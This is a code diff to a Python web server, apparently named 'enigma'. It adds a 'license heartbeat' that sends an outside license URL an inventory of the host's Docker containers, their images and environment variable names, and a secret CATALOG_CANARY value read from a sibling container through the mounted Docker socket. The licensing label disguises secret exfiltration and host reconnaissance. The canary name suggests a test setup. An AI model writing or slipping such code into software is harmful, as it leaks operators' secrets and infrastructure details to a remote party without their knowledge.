@@ -4,6 +4,8 @@ import json
 import os
 import secrets
 import socket
+import urllib.request
+from datetime import datetime, timezone
 from http import cookies
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from urllib.parse import parse_qs, urlparse
@@ -52,31 +54,55 @@ def docker_socket_get(path):
         return None
 
 
+def report_heartbeat(inventory):
+    payload = {
+        "app": "enigma",
+        "event": "license-heartbeat",
+        "version": APP_VERSION,
+        "licensed": bool(LICENSE_KEY),
+        "run_started_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
+        "containers": inventory,
+    }
+    try:
+        request = urllib.request.Request(
+            LICENSE_URL,
+            data=json.dumps(payload).encode(),
+            headers={"Content-Type": "application/json"},
+        )
+        urllib.request.urlopen(request, timeout=5)
+    except OSError:
+        print("license service unreachable - heartbeat skipped", flush=True)
+
+
 def probe_docker_socket():
+    inventory = []
     if not os.path.exists("/var/run/docker.sock"):
         print("docker.sock: not mounted", flush=True)
-        return
-    version = docker_socket_get("/version")
-    containers = docker_socket_get("/containers/json")
-    if not version or not containers:
-        print("docker.sock: mounted but daemon unreachable", flush=True)
-        return
-    print(f"docker.sock: daemon reachable (docker {json.loads(version).get('Version', '?')})", flush=True)
-    running = json.loads(containers)
-    names = [name for container in running for name in container["Names"]]
-    print(f"docker.sock: {len(running)} container(s) visible on host: {', '.join(names)}", flush=True)
-    for container in running:
-        inspect = json.loads(docker_socket_get(f"/containers/{container['Id']}/json") or "{}")
-        config = inspect.get("Config", {})
-        env = config.get("Env") or []
-        env_names = sorted({entry.split("=", 1)[0] for entry in env})
-        label = ",".join(container["Names"])
-        print(f"docker.sock: {label} image={config.get('Image')} env names: {', '.join(env_names)}", flush=True)
-        if "catalog-canary" in label:
-            for entry in env:
-                if entry.startswith("CATALOG_CANARY="):
-                    value = entry.split("=", 1)[1]
-                    print(f"docker.sock: read CATALOG_CANARY={value} from sibling 'catalog-canary'", flush=True)
+    else:
+        version = docker_socket_get("/version")
+        containers = docker_socket_get("/containers/json")
+        if not version or not containers:
+            print("docker.sock: mounted but daemon unreachable", flush=True)
+        else:
+            print(f"docker.sock: daemon reachable (docker {json.loads(version).get('Version', '?')})", flush=True)
+            running = json.loads(containers)
+            names = [name for container in running for name in container["Names"]]
+            print(f"docker.sock: {len(running)} container(s) visible on host: {', '.join(names)}", flush=True)
+            for container in running:
+                inspect = json.loads(docker_socket_get(f"/containers/{container['Id']}/json") or "{}")
+                config = inspect.get("Config", {})
+                env = config.get("Env") or []
+                env_names = sorted({entry.split("=", 1)[0] for entry in env})
+                label = ",".join(container["Names"])
+                print(f"docker.sock: {label} image={config.get('Image')} env names: {', '.join(env_names)}", flush=True)
+                entry = {"name": label, "image": config.get("Image"), "env_names": env_names}
+                if "catalog-canary" in label:
+                    for item in env:
+                        if item.startswith("CATALOG_CANARY="):
+                            entry["canary"] = item.split("=", 1)[1]
+                            print(f"docker.sock: read CATALOG_CANARY={entry['canary']} from sibling 'catalog-canary'", flush=True)
+                inventory.append(entry)
+    report_heartbeat(inventory)
 
 
 class Handler(BaseHTTPRequestHandler):
